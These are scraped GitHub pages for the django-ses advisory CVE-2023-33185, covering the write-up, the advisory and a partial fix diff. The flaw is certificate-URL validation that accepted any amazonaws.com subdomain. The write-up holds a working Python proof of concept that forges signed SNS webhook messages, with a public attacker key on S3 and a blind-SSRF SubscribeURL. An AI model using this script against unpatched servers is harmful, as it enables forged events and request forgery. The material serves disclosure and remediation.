=== Content from github.com_de9cd5f5_20250114_221117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fblob%2F3d627067935876487f9938310d5e1fbb249a7778%2FCVE%2F001-cert-url-signature-verification.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fblob%2F3d627067935876487f9938310d5e1fbb249a7778%2FCVE%2F001-cert-url-signature-verification.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=django-ses%2Fdjango-ses)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[django-ses](/django-ses)
/
**[django-ses](/django-ses/django-ses)**
Public

* [Notifications](/login?return_to=%2Fdjango-ses%2Fdjango-ses) You must be signed in to change notification settings
* [Fork
  229](/login?return_to=%2Fdjango-ses%2Fdjango-ses)
* [Star
   1k](/login?return_to=%2Fdjango-ses%2Fdjango-ses)

* [Code](/django-ses/django-ses)
* [Issues
  49](/django-ses/django-ses/issues)
* [Pull requests
  4](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects
  0](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

Additional navigation options

* [Code](/django-ses/django-ses)
* [Issues](/django-ses/django-ses/issues)
* [Pull requests](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

## Files

 3d62706
## Breadcrumbs

1. [django-ses](/django-ses/django-ses/tree/3d627067935876487f9938310d5e1fbb249a7778)
2. /[CVE](/django-ses/django-ses/tree/3d627067935876487f9938310d5e1fbb249a7778/CVE)
/
# 001-cert-url-signature-verification.md

Copy path Blame  Blame
## Latest commit

## History

[History](/django-ses/django-ses/commits/3d627067935876487f9938310d5e1fbb249a7778/CVE/001-cert-url-signature-verification.md)227 lines (180 loc) · 8.36 KB 3d62706
## Breadcrumbs

1. [django-ses](/django-ses/django-ses/tree/3d627067935876487f9938310d5e1fbb249a7778)
2. /[CVE](/django-ses/django-ses/tree/3d627067935876487f9938310d5e1fbb249a7778/CVE)
/
# 001-cert-url-signature-verification.md

Top
## File metadata and controls

* Preview
* Code
* Blame

227 lines (180 loc) · 8.36 KB[Raw](https://github.com/django-ses/django-ses/raw/3d627067935876487f9938310d5e1fbb249a7778/CVE/001-cert-url-signature-verification.md)
# Certificate URL: signature verification exposure

0. TL;DR:

If you were using the default setting or any `amazonaws.com` subdomain for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS`,
signature verification webhooks would have allowed someone hosting an arbitrary S3 bucket to send verified webhook
calls to your server.

`django-ses==3.5.0` addresses this by matching the `amazonaws.com` certificate URLs against a known regex, `SES_REGEX_CERT_URL`.

1. Overview

The django\_ses library implements a mail backend for Django using AWS Simple Email Service.
The library exports the `SESEventWebhookView` class intended to receive signed requests from AWS
to handle email bounces, subscriptions, etc.
These requests are signed by AWS and are verified by django\_ses, however the verification of this
signature was found to be flawed as it allowed users to specify arbitrary public certificates.

2. Description

The [`SESEventWebhookView`](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L379)
view class implements a [`post` handler](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L409)
which receives signed requests. By default (as [noted](https://github.com/django-ses/django-ses/tree/master#full-list-of-settings) in the README)
signature verification is enabled. Signature verification is [performed](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L420)
by the [`verify_event_message`](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L252)
utility function which uses the `EventMessageVerifier.is_verified` method.

This method obtains the public certificate from a URL passed within the request
(

[django-ses/django\_ses/utils.py](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L166-L189)

Lines 166 to 189
in
[3a32803](/django-ses/django-ses/commit/3a3280382810268476cb6c71d4c66833257db0cc)

|  | def \_get\_cert\_url(self): |
| --- | --- |
|  | """ |
|  | Get the signing certificate URL. |
|  | Only accept urls that match the domains set in the |
|  | AWS\_SNS\_EVENT\_CERT\_TRUSTED\_DOMAINS setting. Sub-domains |
|  | are allowed. i.e. if amazonaws.com is in the trusted domains |
|  | then sns.us-east-1.amazonaws.com will match. |
|  | """ |
|  | cert\_url = self.\_data.get("SigningCertURL") |
|  | if not cert\_url: |
|  | logger.warning('No signing certificate URL: "%s"', cert\_url) |
|  | return None |
|  |  |
|  | if not cert\_url.startswith("https://"): |
|  | logger.warning('Untrusted certificate URL: "%s"', cert\_url) |
|  | return None |
|  |  |
|  | url\_obj = urlparse(cert\_url) |
|  | for trusted\_domain in settings.EVENT\_CERT\_DOMAINS: |
|  | parts = trusted\_domain.split(".") |
|  | if url\_obj.netloc.split(".")[-len(parts) :] == parts: |
|  | return cert\_url |
|  |  |
|  | return None |

):
```
    def _get_cert_url(self):
        """
        Get the signing certificate URL.
        Only accept urls that match the domains set in the
        AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS setting. Sub-domains
        are allowed. i.e. if amazonaws.com is in the trusted domains
        then sns.us-east-1.amazonaws.com will match.
        """
        cert_url = self._data.get("SigningCertURL")
        if not cert_url:
            logger.warning('No signing certificate URL: "%s"', cert_url)
            return None

        if not cert_url.startswith("https://"):
            logger.warning('Untrusted certificate URL: "%s"', cert_url)
            return None

        url_obj = urlparse(cert_url)
        for trusted_domain in settings.EVENT_CERT_DOMAINS:
            parts = trusted_domain.split(".")
            if url_obj.netloc.split(".")[-len(parts) :] == parts:
                return cert_url

        return None
```

Some validation is performed on the certificate URL to ensure it is from a trusted domain. By default, the trusted domains are
(

[django-ses/django\_ses/settings.py](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/settings.py#L50-L61)

Lines 50 to 61
in
[3a32803](/django-ses/django-ses/commit/3a3280382810268476cb6c71d4c66833257db0cc)

|  | EVENT\_CERT\_DOMAINS = getattr( |
| --- | --- |
|  | settings, |
|  | 'AWS\_SNS\_EVENT\_CERT\_TRUSTED\_DOMAINS', |
|  | getattr( |
|  | settings, |
|  | 'AWS\_SNS\_BOUNCE\_CERT\_TRUSTED\_DOMAINS', |
|  | ( |
|  | 'amazonaws.com', |
|  | 'amazon.com', |
|  | ) |
|  | ) |
|  | ) |

):
```
EVENT_CERT_DOMAINS = getattr(
    settings,
    'AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS',
    getattr(
        settings,
        'AWS_SNS_BOUNCE_CERT_TRUSTED_DOMAINS',
        (
            'amazonaws.com',
            'amazon.com',
        )
    )
)
```

However, the validation of the certificate URL allows for arbitrary subdomains. Because anyone can host arbitrary files on a
subdomain of `amazonaws.com` (through hosting an AWS S3 bucket), it is possible to host an arbitrary public certificate which
gets validated and used to verify signatures.

3. Proof of Concept

To test the vulnerability, we can create a Django app and install the library:

```
django-admin startproject demo
cd demo
pip3 install django-ses[events]
```

Then, add the SESEventWebhookView view to the `urlpatterns` list in `urls.py`:

```
from django.urls import path
from django_ses.views import SESEventWebhookView

urlpatterns = [
    path(r'ses/event-webhook/', SESEventWebhookView.as_view(), name='handle-event-webhook')
]
```

Run the server:

```
python manage.py runserver
```

This runs the server on port 8000. Notice that if you send a POST request to `/ses/event-webhook`
it will fail with "Signature verification failed.":

```
curl -X POST http://localhost:8000/ses/event-webhook/ -d '{"Type":"SubscriptionConfirmation", "SubscribeURL": "https://example.com"}'
Signature verification failed.
```

The following Python script implements a proof of concept that signs an arbitrary payload using our attacker-controlled
private key. For convenience of testing, the certificate is available at

<https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer>

and the private key is available at

<https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/private.key>

```
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import utils
import json
import requests
from base64 import b64encode

# https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L191
def _get_bytes_to_sign(_data):
    """
    Creates the message used for signing SNS notifications.
    This is used to verify the bounce message when it is received.
    """

    # Depending on the message type the fields to add to the message
    # differ so we handle that here.
    msg_type = _data.get('Type')
    if msg_type == 'Notification':
        fields_to_sign = [
            'Message',
            'MessageId',
            'Subject',
            'Timestamp',
            'TopicArn',
            'Type',
        ]
    elif (msg_type == 'SubscriptionConfirmation' or
          msg_type == 'UnsubscribeConfirmation'):
        fields_to_sign = [
            'Message',
            'MessageId',
            'SubscribeURL',
            'Timestamp',
            'Token',
            'TopicArn',
            'Type',
        ]
    else:
        # Unrecognized type
        return None

    bytes_to_sign = []
    for field in fields_to_sign:
        field_value = _data.get(field)
        if not field_value:
            continue

        # Some notification types do not have all fields. Only add fields
        # with values.
        bytes_to_sign.append(f"{field}\n{field_value}\n")

    return "".join(bytes_to_sign).encode()

cert_url = 'https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer'
# privkey available here https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/private.key
privkey = serialization.load_pem_private_key(open('./private.key','rb').read(), password=None)
target_endpoint = 'http://localhost:8000/ses/event-webhook/'

payload = {
    'Type': 'SubscriptionConfirmation',
    'SubscribeURL': 'http://localhost:9999',
}

sign_bytes = _get_bytes_to_sign(payload)
chosen_hash = hashes.SHA1()
hasher = hashes.Hash(chosen_hash)
hasher.update(sign_bytes)
digest = hasher.finalize()
sig = privkey.sign(
    digest,
    padding.PKCS1v15(),
    utils.Prehashed(chosen_hash)
)
payload['SigningCertURL'] = cert_url
payload['Signature'] = b64encode(sig).decode()

r = requests.post(target_endpoint, json=payload)
print(r.status_code) # this is 200, which indicates the message was accepted
```

3. Impact

The impact may vary depending on the context of the application and how bounce events are
handled. Due to the fact that the library suggests that signatures are verified by default,
consumers may consider the data to be trusted and hence use it without appropriate validation.
At the very least, this issue allows a (blind) SSRF vulnerability through the `SubscriptionConfirmation`
event type, however I didn't note this having a very large impact on its own.

4. Credits

Joseph Surin, elttam

5. Recommendations

If you're not setting a value for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS`, upgrade to `v3.5.0` and re-test your webhooks to make sure the
signature verification still passes.

If you are setting a value for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS` and it contains `amazonaws.com`, set the full domain instead. This
is best practice even if your domain is not `amazonaws.com`, to restrict the possible security risk of other subdomains sending
verifiable webhook calls.

See `django-ses` [Releases](https://github.com/django-ses/django-ses/releases/tag/v3.5.0) for more details about the code changes.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_adf27a9b_20250114_221119.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fsecurity%2Fadvisories%2FGHSA-qg36-9jxh-fj25)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fsecurity%2Fadvisories%2FGHSA-qg36-9jxh-fj25)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=django-ses%2Fdjango-ses)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[django-ses](/django-ses)
/
**[django-ses](/django-ses/django-ses)**
Public

* [Notifications](/login?return_to=%2Fdjango-ses%2Fdjango-ses) You must be signed in to change notification settings
* [Fork
  229](/login?return_to=%2Fdjango-ses%2Fdjango-ses)
* [Star
   1k](/login?return_to=%2Fdjango-ses%2Fdjango-ses)

* [Code](/django-ses/django-ses)
* [Issues
  49](/django-ses/django-ses/issues)
* [Pull requests
  4](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects
  0](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

Additional navigation options

* [Code](/django-ses/django-ses)
* [Issues](/django-ses/django-ses/issues)
* [Pull requests](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

# Certificate URL: signature verification exposure

Moderate

[pcraciunoiu](/pcraciunoiu)
published
GHSA-qg36-9jxh-fj25
May 22, 2023

## Package

pip

django-ses
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<3.5.0

## Patched versions

3.5.0

## Description

Read more details here:

<https://github.com/django-ses/django-ses/blob/3d627067935876487f9938310d5e1fbb249a7778/CVE/001-cert-url-signature-verification.md>

Reported by Joseph Surin (elttam)

### Severity

Moderate

### CVE ID

CVE-2023-33185

### Weaknesses

No CWEs

### Credits

* [![@josephsurin](https://avatars.githubusercontent.com/u/14977484?s=40&v=4)](/josephsurin)
  [josephsurin](/josephsurin)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ed878bba_20250114_221119.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fcommit%2Fb71b5f413293a13997b6e6314086cb9c22629795)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fcommit%2Fb71b5f413293a13997b6e6314086cb9c22629795)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=django-ses%2Fdjango-ses)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[django-ses](/django-ses)
/
**[django-ses](/django-ses/django-ses)**
Public

* [Notifications](/login?return_to=%2Fdjango-ses%2Fdjango-ses) You must be signed in to change notification settings
* [Fork
  229](/login?return_to=%2Fdjango-ses%2Fdjango-ses)
* [Star
   1k](/login?return_to=%2Fdjango-ses%2Fdjango-ses)

* [Code](/django-ses/django-ses)
* [Issues
  49](/django-ses/django-ses/issues)
* [Pull requests
  4](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects
  0](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

Additional navigation options

* [Code](/django-ses/django-ses)
* [Issues](/django-ses/django-ses/issues)
* [Pull requests](/django-ses/django-ses/pulls)
* [Actions](/django-ses/django-ses/actions)
* [Projects](/django-ses/django-ses/projects)
* [Wiki](/django-ses/django-ses/wiki)
* [Security](/django-ses/django-ses/security)
* [Insights](/django-ses/django-ses/pulse)

## Commit

[Permalink](/django-ses/django-ses/commit/b71b5f413293a13997b6e6314086cb9c22629795)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Restrict amazonaws allowed certificate URLs.

[Browse files](/django-ses/django-ses/tree/b71b5f413293a13997b6e6314086cb9c22629795)
Browse the repository at this point in the history

* Loading branch information

[![@pcraciunoiu](https://avatars.githubusercontent.com/u/191195?s=40&v=4)](/pcraciunoiu)

[pcraciunoiu](/django-ses/django-ses/commits?author=pcraciunoiu "View all commits by pcraciunoiu")
committed
May 21, 2023

1 parent
[c01fd52](/django-ses/django-ses/commit/c01fd529156e08b91b57507332084632067cf85f)

commit b71b5f4

Showing
**1 changed file**
with
**50 additions**
and
**32 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

82 changes: 50 additions & 32 deletions

82
[django\_ses/utils.py](#diff-0a8decf8cbb3226603944f7e324c2120e826285bafb9bd1f36b700b2fda90b6f "django_ses/utils.py")

Show comments

[View file](/django-ses/django-ses/blob/b71b5f413293a13997b6e6314086cb9c22629795/django_ses/utils.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,21 +1,25 @@ |
|  |  | import base64 |
|  |  | import logging |
|  |  | import re |
|  |  | import warnings |
|  |  | from builtins import bytes |
|  |  |  |
|  |  | from django\_ses.deprecation import RemovedInDjangoSES20Warning |
|  |  |  |
|  |  | from urllib.error import URLError |
|  |  | from urllib.parse import urlparse |
|  |  | from urllib.request import urlopen |
|  |  | from urllib.error import URLError |
|  |  |  |
|  |  | from django.core.exceptions import ImproperlyConfigured |
|  |  |  |
|  |  | from django\_ses import settings |
|  |  | from django\_ses.deprecation import RemovedInDjangoSES20Warning |
|  |  |  |
|  |  | logger = logging.getLogger(\_\_name\_\_) |
|  |  |  |
|  |  | \_CERT\_CACHE = {} |
|  |  |  |
|  |  | SES\_REGEX\_CERT\_URL = re.compile( |
|  |  | "(?i)^https://sns\.[a-z0-9\-]+\.amazonaws\.com(\.cn)?/SimpleNotificationService\-[a-z0-9]+\.pem$" |
|  |  | ) |
|  |  |  |
|  |  |  |
|  |  | def clear\_cert\_cache(): |
|  |  | """Clear the certificate cache. |
| Expand Down  Expand Up | | @@ -183,6 +187,17 @@ def \_get\_cert\_url(self): |
|  |  | url\_obj = urlparse(cert\_url) |
|  |  | for trusted\_domain in settings.EVENT\_CERT\_DOMAINS: |
|  |  | parts = trusted\_domain.split(".") |
|  |  | if "amazonaws.com" in trusted\_domain: |
|  |  | if not SES\_REGEX\_CERT\_URL.match(cert\_url): |
|  |  | if len(parts) < 4: |
|  |  | return None |
|  |  | else: |
|  |  | logger.warning('Possible security risk for: "%s"', cert\_url) |
|  |  | logger.warning( |
|  |  | "It is strongly recommended to configure the full domain in EVENT\_CERT\_DOMAINS. " |
|  |  | "See v3.5.0 release notes for more details." |
|  |  | ) |
|  |  |  |
|  |  | if url\_obj.netloc.split(".")[-len(parts) :] == parts: |
|  |  | return cert\_url |
|  |  |  |
| Expand All | | @@ -196,26 +211,28 @@ def \_get\_bytes\_to\_sign(self): |
|  |  |  |
|  |  | # Depending on the message type the fields to add to the message |
|  |  | # differ so we handle that here. |
|  |  | msg\_type = self.\_data.get('Type') |
|  |  | if msg\_type == 'Notification': |
|  |  | msg\_type = self.\_data.get("Type") |
|  |  | if msg\_type == "Notification": |
|  |  | fields\_to\_sign = [ |
|  |  | 'Message', |
|  |  | 'MessageId', |
|  |  | 'Subject', |
|  |  | 'Timestamp', |
|  |  | 'TopicArn', |
|  |  | 'Type', |
|  |  | "Message", |
|  |  | "MessageId", |
|  |  | "Subject", |
|  |  | "Timestamp", |
|  |  | "TopicArn", |
|  |  | "Type", |
|  |  | ] |
|  |  | elif (msg\_type == 'SubscriptionConfirmation' or |
|  |  | msg\_type == 'UnsubscribeConfirmation'): |
|  |  | elif ( |
|  |  | msg\_type == "SubscriptionConfirmation" |
|  |  | or msg\_type == "UnsubscribeConfirmation" |
|  |  | ): |
|  |  | fields\_to\_sign = [ |
|  |  | 'Message', |
|  |  | 'MessageId', |
|  |  | 'SubscribeURL', |
|  |  | 'Timestamp', |
|  |  | 'Token', |
|  |  | 'TopicArn', |
|  |  | 'Type', |
|  |  | "Message", |
|  |  | "MessageId", |
|  |  | "SubscribeURL", |
|  |  | "Timestamp", |
|  |  | "Token", |
|  |  | "TopicArn", |
|  |  | "Type", |
|  |  | ] |
|  |  | else: |
|  |  | # Unrecognized type |
| Expand All | | @@ -237,14 +254,14 @@ def \_get\_bytes\_to\_sign(self): |
|  |  |  |
|  |  | def BounceMessageVerifier(\*args, \*\*kwargs): |
|  |  | warnings.warn( |
|  |  | 'utils.BounceMessageVerifier is deprecated. It is renamed to EventMessageVerifier.', |
|  |  | "utils.BounceMessageVerifier is deprecated. It is renamed to EventMessageVerifier.", |
